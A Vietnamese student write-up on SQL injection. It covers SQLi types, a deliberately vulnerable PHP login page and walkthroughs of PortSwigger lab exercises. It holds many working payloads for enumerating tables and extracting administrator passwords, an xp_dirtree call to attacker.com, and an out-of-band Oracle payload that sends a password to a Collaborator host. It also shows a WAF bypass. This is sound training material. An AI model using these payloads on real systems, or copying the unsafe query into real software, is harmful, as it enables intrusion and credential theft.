# Task 2

Task 2:
– Tìm hiểu chi tiết về lỗ hổng SQLI -> phân loại -> (Không bề lý thuyết nhiều quá mà chỉ nói theo ý hiểu)
– Code web PHP (không cần CSS) chức năng đăng nhập đăng kí và kết nối với MySQL chứa lỗ hổng SQLI + khai thác để liệt kê được dữ liệu quan trọng trong MySQL đã dựng, áp dụng debug với x-debug để quan sát một số hàm filter như ‘mysqli_real_escape_string’ nếu có
– Clear lab SQLI trên : https://portswigger.net/web-security/all-labs 
– Lưu ý: viết Write up đầy đủ các phần
DEADLINE: 24h 1/6https://portswigger.net/web-security/all-labs

Tìm hiểu về SQLi

## 1. Khái niệm

SQL injection là một kỹ thuật tấn công bằng cách tấn công chèn mã SQL độc hại vào đầu vào của người dùng nhằm can thiệp vào truy vấn cơ sở dữ liệu, từ đó: xem được dữ liệu nhạy cảm( email, password,..), chiếm tài khoản admin, xóa hoặc thêm dữ liệu, thực thi lệnh hệ thống,…

## 2. Các loại SQLi phổ biến

1. In-Band SQLi : thấy dữ liệu ngay
    - Union-based SQLi : sử dụng câu lệnh union để gộp thêm bảng nhằm hiển thị dữ liệu nhạy cảm
    - Error-based SQLi : gây lỗi để hiện dữ liệu trong thông báo ( error messages)
2. Blind SQLi : Không hiện dữ liệu ngay
    - Boolean-based : dựa vào phản hồi đúng/sai (conditional respone, conditional error)
    - Time-based : dựa vào độ trễ của phản hồi để biết điều kiện tiêm vào đúng hay sai
3. Out-of-band SQLi : gửi kết quả ra ngoài (hầu hết qua DNS/HTTP để dễ qua WAF)

## 3. Cách khai thác

3.1 Phát hiện

- Gửi thử các dấu ‘ ‘’ “ ; - -  #
    
    ' and (select cast('abc' as int))—  và xem phản hồi phản hồi 
    
- Gửi các điều kiện boolean như OR 1=1, OR 1=2,… và xem phản hồi
- Gửi các sql lỗi cú pháp như ' and (select case when(1=1) then 1/0 else 'a')='a đợi phản hồi có lỗi không
- Gửi các payload về time-based như SLEEP(10), PG_SLEEP(10), WAIT FOR DELAYS ‘0:0:10’  và đợi phản hồi
- Thử các kỹ thuật union select để lấy dữ liệu

Nếu phản hồi là : 

error hiện ra                                                            → error based

không hiện gì nhưng khác nhau giữa 1=1 và 1=2 →  boolean based (conditional response)

lỗi cú hệ thống khi 1=1 và khiến 1/0                      → boolean based (conditional error) 

phản hồi chậm                                                        → time based

không hiện gì hết                                                    → thử out of band

3.2 Xác định thông tin database

- Xác định bằng cách sử dụng truy vấn như SELECT @@version (MySQL), SELECT * FROM v$version (Oracle)...
- Recon bằng extension, tool, ...
- Dựa vào lỗi SQL server trả về.

3.3 Khai thác

In-Band SQLi

- Error-based :Lợi dụng lỗi hệ thống hiện ra trên web để lộ thông tin nhạy cảm về cấu trúc csdl hoặc nội dung bảng
    
    Chèn các dấu ‘ hoặc  ‘’ hoặc  ‘- -   hoặc ' and cast((select 1) as int)- -
    
    trang web sẽ hiện ra thông báo lỗi chứa nội dung “You have an error in your SQL syntax”, sau đó chúng ta có thể thêm các payload như sau ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))- -
    
    hoặc CAST((SELECT example_column FROM example_table) AS int) để lấy dữ liệu từ error messages
    
- Union-based : nối các bảng khác vào bằng union và trả về kết quả của bảng đó bằng select
    
    Bước 1: Xác định số cột để tấn công 
    
    ‘ order by 1- - 
    
    ‘ order by 2- - 
    
    ‘order by 3- -
    
    cho đến khi hiện thông báo lỗi thì số cột là số trước đó
    
    Hoặc 
    
    ‘ union select null- - 
    
    ‘union select null,null- - 
    
    ‘union select null,null,null- - 
    
    cho đến khi không lỗi thì số null là số cột
    
    Bước 2: Truy xuất database, tên bảng, tên cột
    
    #Database names
    -1' UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
    
    #Tables of a database
    -1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=[database]
    
    hoặc 
    
     ‘UNION SELECT table_name FROM information_schema.tables
    
    #Column names
    -1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=[table name]
    
    hoặc
    
    ‘ UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'Users’
    
    Bước 3: Lấy dữ liệu 
    
    ' UNION SELECT NULL, username, password FROM users- - 
    

Blind SQLi

- Boolean-base ( conditional respones ) : dựa vào điều kiện đúng sai trong câu payload để trang hiển thị ra nội dung khác nhau

Thử điều kiện đúng/sai để xác định khả năng khai thác:

' AND 1=1 --   → Web vẫn hoạt động
' AND 1=2 --   → Web lỗi hoặc không hiển thị gì

- boolean-base ( conditional error) : dựa vào câu lệnh làm lỗi hệ thống như 1/0 để kiểm tra điều kiện đúng/ sai

' and (select case when(1=1) then 1/0 else 'a')='a đúng thì gây lỗi vì có 1/0

' and (select case when(1=2) then 1/0 else 'a')='a sai thì không gây lỗi vì trả về ‘a’=’a’

- Time-based

' ; if(1=1) wait for delays '0:0:10'--
'; select case when(1=1) then sleep(10) else sleep(0) end--

Out-of-band SQLi

'; exec xp_dirtree '\\[attacker.com](http://attacker.com/)\share' --

## Lưu ý: Khi kiểm tra được csdl là Oracle thì

- comment phải dử dụng `-- -`
- `select` phải phải `from dual--`
- không cho phép kết quả trả về nhiều dòng, phải dùng `rownum=1` (trong csdl khác thì dùng `limit 1`
- dấu = trong oracle có thể bị sai nên sử dụng nối chuỗi `||`

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Code web chứa SQLi

```jsx
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <?php
session_start();
require 'connect.php';
if($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    //sqli
    $sql="SELECT * FROM users WHERE email = '$email'"; //truy vấn SQL
    $result = $conn->query($sql); //thực hiện truy vấn

    // $stmt = $conn->prepare("SELECT * FROM users WHERE email = ?"); //chuẩn bị truy vấn
    // $stmt->bind_param("s", $email);  // gắn email vào prepare
    // $stmt->execute();
    // $result = $stmt->get_result(); //lấy kết quả truy vấn
    $user = $result->fetch_assoc(); //chuyển kết quả thành mảng

    // if ($user && password_verify($password, $user['password'])) {//xác thực user và so sánh mật khẩu
        if($user){
        $_SESSION['user'] = $user;
        header("Location: profile.php");
        exit();
    } else {
        echo "Sai tài khoản hoặc mật khẩu!";
    }
}
?>
<h2>Đăng nhập</h2>
<form method="POST">
    Email: <input type="text" name="email" required><br>
    Mật khẩu: <input type="password" name="password" required><br>
    <input type="submit" value="Đăng nhập">
</form>
    <a href="index.php">Quay lại trang chủ</a>
</body>
</html>

```

Sử dụng web đăng nhập, đăng ký đã tạo sẵn ở task 1 nhưng sửa đoạn Prepared Statement để chuẩn bị truy vấn sql thành $sql="SELECT * FROM users WHERE email = '$email'"; khi đó đã tạo ra được lỗ hổng sqli và sửa type=”email” thành type=”text” để có thể nhập được payload ‘ or ‘1’=’1 thì truy vấn sẽ trở thành

 SELECT * FROM users WHERE email = ‘’ or ‘1’=’1’ 

lúc này điều kiện where sẽ trở thành luôn đúng

![image.png](image.png)

nhưng trang vẫn ra hiện ra là sai mật khẩu vì tôi code có đoạn if ($user && password_verify($password, $user['password'])) để kiểm tra mật khẩu, lúc này tôi chỉ cần sửa lại thành if($user){ thì sẽ đăng nhập được

![image.png](image%201.png)

nó sẽ tự động in ra thông tin cá nhân của user đầu tiên trong cơ sở dữ liệu vì trong file profile.php chỉ in ra một user

### Áp dụng xdebug

thử debug file login.php và đặt breakpoin tại câu lệnh POST email

![image.png](image%202.png)

thử login  `' or '1'='1`  câu truy vấn lúc POST lên vẫn là `email = "' or '1'='1"`   rất dễ bị SQLi, 

ta thay bằng hàm `mysqli_real_escape_string` để escaped các ký tự đặc biệt 

ta thấy dấu `'` đã bị escape thành `\'`

![image.png](image%203.png)

## 4. Lab SQLi trên portswigger

1. Lab 1: **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

 `' OR 1=1--`

⇒ truy vấn sẽ trở thành 

`SELECT * FROM products WHERE category = 'Lifestyle' OR 1=1 -- ' AND released = 1`

query sẽ trả về toàn bộ bảng products, bao gồm những sản phẩm bị ẩn 

1. Lab 2:  **SQL injection vulnerability allowing login bypass**

nhập vào phần username là `administrator’--` 

⇒ query sẽ trở thành `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'abc';` ta sẽ đăng nhập được tài khoản admin mà không cần mật khẩu 

1. **Lab: SQL injection attack, querying the database type and version on Oracle**

<aside>
💡

To solve the lab, display the database version string.

</aside>

`' union select banner, null from v$version--`

cột banner của bảng v$version trong oracle 

1. **Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

<aside>
💡

To solve the lab, display the database version string.

</aside>

`' union select @@version, null-- -`

trong MySQL có 2 kiểu comment là `#` 

hoặc `--` và phải có thêm một ký tự sau dấu cách nữa thì mới tính là comment hợp lệ nên phải dùng `-- -`

1. **Lab: SQL injection attack, listing the database contents on non-Oracle databases**

<aside>
💡

To solve the lab, log in as the `administrator` user.

</aside>

thử `''` → hiển thị kết quả ra trang

xác định số cột `' union select null, null--`

xác định cột sử dụng string `'union select 'a', 'a'--`

xác định tên bảng `'union SELECT table_name FROM information_schema.tables--` → tên bảng là users_tmyfnz

xac định tên cột trong bảng users_tmyfnz   `'union SELECT column_name FROM information_schema.columns WHERE table_name = 'users_tmyfnz'`--

→ username_eayxna

password_isnano

tìm các giá trị user trong 2 cột kia  `'union select **username_eayxna, password_isnano from users_tmyfnz--**` 

→ Đăng nhập 

| administrator | gkhpdked5wo6w1ajqbf5 |
| --- | --- |
1. **Lab: SQL injection attack, listing the database contents on Oracle**

Tương tự lab 5 nhưng trong oracle thì tên tất cả các bảng là `all_tables` , tên các cột là `all_tab_column`

1. **Lab: SQL injection UNION attack, determining the number of columns returned by the query**

<aside>
💡

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

</aside>

`‘ union select null, null, null--`    xác định có 3 cột 

1. **Lab: SQL injection UNION attack, finding a column containing text**

<aside>
💡

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

</aside>

`‘ union select null, ‘nJm4EM’, null--`

1. **Lab: SQL injection UNION attack, retrieving data from other tables**

<aside>
💡

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

</aside>

`' union select 'a', version()--` có 2 cột và là csdl là loại PortgreSQL và cả 2 cột đều là string

`' union select null, table_name from information_schema.tables--`  tìm ra tên bảng là user

`'union select null, column_name FROM information_schema.columns WHERE table_name = 'Users'`  tìm ra tên cột là password và username trong bảng users

`'union select username, password from users--`  tìm ra tài khoản và password của admin rồi đăng nhập 

1. **Lab: SQL injection UNION attack, retrieving multiple values in a single column**

<aside>
💡

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

</aside>

`' order by 2--`  xác định 2 cột

`' union null, 'a'--` nhưng chỉ có cột 2 là string

xác định version, tên bảng, tên các cột của bảng tương tự lab 9

`' union select null, username || '~' || password from users--`  sử dụng nối chuỗi của PortgreSQL

1. **Lab: Blind SQL injection with conditional responses**

<aside>
💡

To solve the lab, log in as the `administrator` user

</aside>

test `TrackingId=vU' or 1=1--` thấy trang hiện ra welcome back! vì điều kiện đúng khiến TrackingId trở thành đúng

`TrackingId=vU' or 1=2--` trang không hiện welcome back nữa vì điều kiện sai 

⇒ boolean based( conditional respones) 

`' or (select 'a' from users limit 1)='a`   hiện welcome back nếu có bảng users, limit 1 là lấy 1 hàng đầu tiên

`' or (select 'a' from users where username='administrator')='a` xác nhận có user tên là administrator

`' or (select 'a' from users where username='administrator' and length(password)='20')='a`  kiểm tra độ dài mật khẩu 

`' or substring((select password from users where username='administrator'),1,1)>'a`  dò từng ký tự của mật khẩu bằng burp intruder

1. **Lab: Blind SQL injection with conditional errors**

<aside>
💡

To solve the lab, log in as the `administrator` user

</aside>

thử `‘` → gây lỗi vì sai cú pháp 

`‘’` → không lỗi

`' and 1=1--` 

`' and 1=2--` không có gì xảy ra

⇒ không phải conditional respones

nghi vấn là conditional error

`' and (select case when(1=1) then 1/0 else 'a' end)='a`  không lỗi 

`' and (select case when(1=2) then 1/0 else 'a' end)='a` không lỗi

thử nối chuỗi `'|| (select '')||'`  → truy vấn vẫn không hợp lệ

`'|| ( select '' from dual)||'`   → không còn lỗi nữa, sau ra đây là Oracle và là kiểu conditional error

`'|| (select '' from users where rownum=1)||'`  kiểm tra có bảng users không, và sửa dụng rownum=1 để giới hạn dòng trong Oracle

`'||(select case when(1=2) then to_char(1/0) else 'a' end from dual)||'` không lỗi

`'||(select case when(1=1) then to_char(1/0) else 'a' end from dual)||'` có lỗi, to_char là để ép chuỗi trong oracle

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  xác nhận người dùng administrator tồn tại

`'||(select case when(length(password)>'19') then to_char(1/0) else 'a' end from users where username='administrator')||’` kiểm tra độ dài password

`'||(select case when substr(password,1,1)='a' then to_char(1/0) else 'a' end from users where username='administrator')||’`  brute force bằng burp intruder để dò từng ký tự của mật khẩu 

1. **Lab: Visible error-based SQL injection**

<aside>
💡

To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account

</aside>

thử `'` hiện ra error messages 

![image.png](image%204.png)

      `''` không lỗi

⇒ đây là kiểu error messages

`' and cast((select 1) as int)` xác nhận lỗi rằng AND phải là một biểu thức boolean

![image.png](image%205.png)

`' and cast((select 1) as int)='1` không có lỗi nữa

`' AND 1=CAST((SELECT username FROM users) AS int)--` nhận được lỗi và thấy rằng truy vấn bị cắt ngắn đi

![image.png](image%206.png)

hãy xóa bớt giá trị của trackingId đi 

![image.png](image%207.png)

giờ đã thấy thông báo more than one row, tức là có nhiều hàng được trả về, hãy giới hạn bằng `limit 1`

![image.png](image%208.png)

ra được tên user đầu tiên là admin

`' AND 1=CAST((SELECT password FROM users limit 1) AS int)--`

![image.png](image%209.png)

tìm được password của admin

1. **Lab: Blind SQL injection with time delays**

<aside>
💡

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay

</aside>

web sử dụng synchronously tức là truy vấn thực thi đồng bộ nên ta có thể sử dụng time-delays

`'||pg_sleep(10)--`  pg_sleep() là hàm trong PortgreSQL yêu cầu ngủ 

`||`  là dấu nối chuỗi trong SQL

1. **Lab: Blind SQL injection with time delays and information retrieval**

<aside>
💡

To solve the lab, log in as the `administrator` user.

</aside>

tương tự lab 14 sử dụng time-delays thử payload `'||pg_sleep(5)--` thấy web chậm đi 5 giây → đây là PortgerSQL

`'%3Bselect+case+when(1=1)+then+pg_sleep(5)+end--` nếu điều kiện đúng thì pg_sleep(5)

`'%3Bselect+case+when(username='administrator')+then+pg_sleep(5)+end+from+user--` → có độ trễ phản hồi → tồn tại  người dùng tên là adminnistrator

`'%3Bselect+case+when(username=’administrator’+and+length(password)>’19’+then+pg_sleep(5)+end+from+users--`

kiểm tra độ dài mật khẩu

tương tự dò độ dài mật khẩu `'%3Bselect+case+when(username=’administrator’+and+substring((password,2,1)='a')+then+pg_sleep(5)+end+from+users--`

1. **Lab: Blind SQL injection with out-of-band interaction**

<aside>
💡

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

</aside>

trang web sử dụng asynchronously tức là thực hiện không đồng bộ, nghĩa là trang web không có độ trễ thời gian hay lỗi → thử out-of-band 

ta có thể khiến cơ sở dữ liệu tạo ra một tương tác ngoài băng tần (out-of-band interaction) với một máy chủ bên ngoài, chẳng hạn như một yêu cầu DNS lookup (tra cứu tên miền).

Sử dụng công cụ Burp Collaborator để tạo ra một tên miền tạm thời và phát hiện xem web có gửi DNS lookup đến tên miền đó để phân giải địa chỉ ip không

Chèn payload này vào trackingId, thay `BURP-COLLABORATOR-SUBDOMAIN` bằng tên miền tạm thời do burp collaborator tạo ra, ví dụ [qicfj5sz6cvr9broxag7n7hkqbw1kq.burpcollaborator.net](http://qicfj5sz6cvr9broxag7n7hkqbw1kq.burpcollaborator.net/)

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--` 

Giải thích payload : 

- Oracle có hàm `EXTRACTVALUE(xmltype, xpath)` để **trích xuất giá trị từ XML**.
- Dùng nó để ép csdl xử lý nội dung XML tùy chỉnh
- `xmltype('<XML_PAYLOAD>')`  tạo một XMl object từ đoạn XMl bạn chỉ định
- Trong payload này, XML có chèn thực thể `<!ENTITY % remote SYSTEM "...">`, tức là **tham chiếu đến một tài nguyên từ xa**.
- `<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">` Khai báo thực thể bên ngoài (external entity), tên là `remote`. Khi XML parser xử lý, nó **gửi yêu cầu HTTP hoặc DNS tới tên miền đó**. Burp Collaborator sẽ nhận được yêu cầu này nếu payload được thực thi
- `%remote;` gọi thực thể %remote
- `/l` là một **đường dẫn XPath**, được dùng để trích xuất nội dung XML. Trong trường hợp này:

Kiểm tra Burp colaborator client xem có yêu cầu DNS look up nào từ web không, nếu có ta đã thành công

![image.png](image%2010.png)

1. **Lab: Blind SQL injection with out-of-band data exfiltration**

<aside>
💡

To solve the lab, log in as the `administrator` user.

</aside>

tương tự lab 17, sử dụng payload `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

![image.png](image%2011.png)

password được nối ở đầu chuỗi 

1. **Lab: SQL injection with filter bypass via XML encoding**

<aside>
💡

To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

</aside>

Tính năng kiểm tra hàng tồn kho của web (check stock) được gửi dữ liệu đi ở định dạng XML thông qua producId và storeId, giá trị của nó được đưa trực tiếp vào truy vấn SQL dẫn đến SQLi

![image.png](image%2012.png)

thử chèn payload sử dụng nối chuỗi vì truy vấn này chỉ trả về một cột vào producId hoặc storeId 

![image.png](image%2013.png)

thấy trang hiện ra "Attack detected”  tức là payload bị chặn qua WAF

Giải pháp là sử dụng hackvertor để mã hóa XML 

`<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>`  xác định số cột 

`<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`  nối chuỗi để lấy username và password của admin
